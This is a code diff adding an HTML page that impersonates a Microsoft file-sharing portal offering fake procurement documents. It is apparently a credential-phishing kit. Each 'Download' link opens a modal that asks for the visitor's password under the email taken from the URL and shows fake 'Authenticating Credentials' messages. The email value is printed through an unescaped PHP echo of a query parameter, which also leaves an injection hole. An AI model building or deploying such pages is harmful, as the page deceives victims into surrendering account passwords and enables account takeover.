@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Materia</title>
+
+    <meta name="description" content="_Materials">
+  
+
+
+    <meta name="keywords" content="_Demands">
+
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta property="og:title" content="_Overview | Specs">
+
+    <meta property="og:type" content="website">
+
+    <meta property="og:site_name" content="_&amp;Requirements">
+
+    <meta property="og:description" content="&amp;RFQ_">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   
+
+    <script src="./index-2_files/jquery.min.js.download"></script>
+    <script src="./index-2_files/main.js.download"></script><script>(function inject() {
+        function GenerateQuickId() {
+          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+          return randomStrId.substring(0, 22);
+        }
+
+        ;
+
+        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
+          try {
+            var id = 'detector';
+            var mes = {
+              posdMessageId: 'PANELOS_MESSAGE',
+              posdHash: GenerateQuickId(),
+              type: 'VIDEO_XHR_CANDIDATE',
+              from: id,
+              to: id.substring(0, id.length - 2),
+              content: {
+                requestMethod: requestMethod_,
+                url: url_,
+                type: type_,
+                content: content_
+              }
+            };
+            window.postMessage(mes, '*');
+          } catch (e) {}
+        }
+
+        ;
+        var open = XMLHttpRequest.prototype.open;
+
+        XMLHttpRequest.prototype.open = function () {
+          this.requestMethod = arguments[0];
+          open.apply(this, arguments);
+        };
+
+        var send = XMLHttpRequest.prototype.send;
+
+        XMLHttpRequest.prototype.send = function () {
+          var onreadystatechange = this.onreadystatechange;
+
+          this.onreadystatechange = function () {
+            if (this.readyState === 4) {
+              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
+            }
+
+            if (onreadystatechange) {
+              return onreadystatechange.apply(this, arguments);
+            }
+          };
+
+          return send.apply(this, arguments);
+        };
+
+        var nativeFetch = fetch;
+
+        fetch = function fetch() {
+          var _this = this;
+
+          var args = arguments;
+          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
+          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
+          return new Promise(function (resolve, reject) {
+            var promise = nativeFetch.apply(_this, args);
+            promise.then(function (response) {
+              if (response.body instanceof ReadableStream) {
+                var nativeJson = response.json;
+
+                response.json = function () {
+                  var _arguments = arguments,
+                      _this2 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var jsonPromise = nativeJson.apply(_this2, _arguments);
+                    jsonPromise.then(function (jsonResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
+                      resolve(jsonResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+
+                var nativeText = response.text;
+
+                response.text = function () {
+                  var _arguments2 = arguments,
+                      _this3 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var textPromise = nativeText.apply(_this3, _arguments2);
+                    textPromise.then(function (textResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
+                      resolve(textResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+              }
+
+              resolve.apply(this, arguments);
+            })["catch"](function () {
+              reject.apply(this, arguments);
+            });
+          });
+        };
+      })();</script><link rel="stylesheet" type="text/css" href="./index-2_files/bootstrap.min.css"><link rel="stylesheet" type="text/css" href="./index-2_files/bootstrap.min.css.map"><script src="./index-2_files/jquery.min.js.download" type="text/javascript"></script><script src="./index-2_files/bootstrap.min.js.download" type="text/javascript"></script><script src="./index-2_files/app.js.download" type="text/javascript"></script><script src="./index-2_files/validate.js.download" type="text/javascript"></script>
+    <style>
+        video {
+            object-fit: cover;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+    </style>
+</head>
+
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOC45Iiwic2NvcmUiOjEwODA5fV0=">
+
+    <script>
+       
+    </script>
+    <nav class="navbar " style="background-color:#026FC2;">
+        <div class="container" bis_skin_checked="1">
+            <a class="navbar-brand" href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal"><img src="./index-2_files/logo.jpg"></a>
+            <button class="navbar-toggler " type="button ">
+                <span class="navbar-toggler-icon text-dark"></span>
+            </button>
+
+        </div>
+    </nav>
+
+
+    <div class="container" bis_skin_checked="1">
+        <div class="row mt-4" bis_skin_checked="1">
+            <div class="col-sm-9 p-0 " style="box-shadow:2px 2px  3px gray" bis_skin_checked="1">
+                <table class="table">
+                    <thead>
+                        <tr>
+                            <th class="col-checkbox">
+                                <label>
+                    <input type="checkbox" class="toggle-all-checkboxes" checked="">
+                    <span></span>
+                    </label>
+                            </th>
+                            <th>Name</th>
+                            <th>Size</th>
+                            <th class="col-action"></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="9y431yWQ8h13" id="frm-deliveryDetailForm-deliveryDetailForm-9y431yWQ8h13" checked="" class="toggle-checkbox" data-download-size="1680663">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Specific products, with detailed descriptions.pdf
+                            </td>
+                            <td class="color-brighter">1.6 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="9y431yWQ8h13">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="SEguAYyma6th" id="frm-deliveryDetailForm-deliveryDetailForm-SEguAYyma6th" checked="" class="toggle-checkbox" data-download-size="1744">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Product quantity.xls
+                            </td>
+                            <td class="color-brighter">1.1 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="SEguAYyma6th">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="pADZ2zIuVLAi" id="frm-deliveryDetailForm-deliveryDetailForm-pADZ2zIuVLAi" checked="" class="toggle-checkbox" data-download-size="4301">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Sample image.jpg
+                            </td>
+                            <td class="color-brighter">1.8 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="pADZ2zIuVLAi">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                        <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="" class="toggle-checkbox" data-download-size="1086">
+                        <span></span>
+                        </label>
+                            </td>
+                            <td class="break-word">
+                                Company profile.pdf
+                            </td>
+                            <td class="color-brighter">1.03 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                        Download
+                        </span>
+                                </a>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                            <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="" class="toggle-checkbox" data-download-size="1086">
+                            <span></span>
+                            </label>
+                            </td>
+                            <td class="break-word">
+                                Delivery requirements.pdf
+                            </td>
+                            <td class="color-brighter">1.07 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                            Download
+                            </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="" class="toggle-checkbox" data-download-size="1086">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Important Organizational Update For Partners.pdf
+                            </td>
+                            <td class="color-brighter">2.67 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="" class="toggle-checkbox" data-download-size="1086">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Terms and conditions.pdf
+                            </td>
+                            <td class="color-brighter">2.03 MB</td>
+                            <td class="col-action">
+                                <a href="https://mcro64-upload.netlify.app/index-2.html?1.bdk1o2izzx=<?php echo $_GET['x1']; ?>#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+
+            </div>
+
+            <div class="col-sm-3" bis_skin_checked="1">
+
+            </div>
+        </div>
+        <div class="my-4" style="font-size: 12px;" bis_skin_checked="1">© Microsoft 2021.</div>
+    </div>
+    
+
+
+
+    <!-- The Modal -->
+    <div class="modal" id="myModal" bis_skin_checked="1">
+        <div class="modal-dialog modal-md" bis_skin_checked="1">
+            <div class="modal-content" bis_skin_checked="1">
+
+                <!-- Modal Header -->
+                <div class="modal-header" bis_skin_checked="1">
+                    <img src="./index-2_files/loo.jpg">
+                    <button type="button" class="close" data-dismiss="modal">×</button>
+                </div>
+
+                <!-- Modal body -->
+                <div class="modal-body " bis_skin_checked="1">
+                    <div id="msg" class="alert alert-success" bis_skin_checked="1" style="display: none;">
+                        Authenticating Credentials, Please wait...
+                    </div>
+                    <div id="msg2" class="alert alert-danger" bis_skin_checked="1" style="display: none;">
+                        Invalid Credentials!
+                    </div>
+
+                    <form method="post" id="profileUp">
+                        <label for="demo">Email address</label>
+                        <input type="text" readonly="" class="form-control" value="<?php echo $_GET['x1']; ?>" placeholder="Email" id="x1" name="x1">
+                        <div bis_skin_checked="1"><small></small></div>
+                        <label for="demo">Password</label>
+                        <input type="password" class="form-control" value="" placeholder="Receiver&#39;s Password" id="x2" name="x2" required="">
+                        <div class="mb-3" bis_skin_checked="1"><small>Required for end to end encryption</small></div>
+                        <hr>
+                        <div class="mb-3" bis_skin_checked="1"> <button type="submit" id="byn" class="btn-primary btn">Access File</button>
+                        </div>
+                        <div style="font-size: 10px;" bis_skin_checked="1">
+                            All rights reserved. ©Microsoft 2021
+                        </div>
+                </form></div>
+                
+            </div>
+
+
+        </div>
+    </div>
+    
+
+
+
+
+  
+
+Success!
+
+
+</body></html>
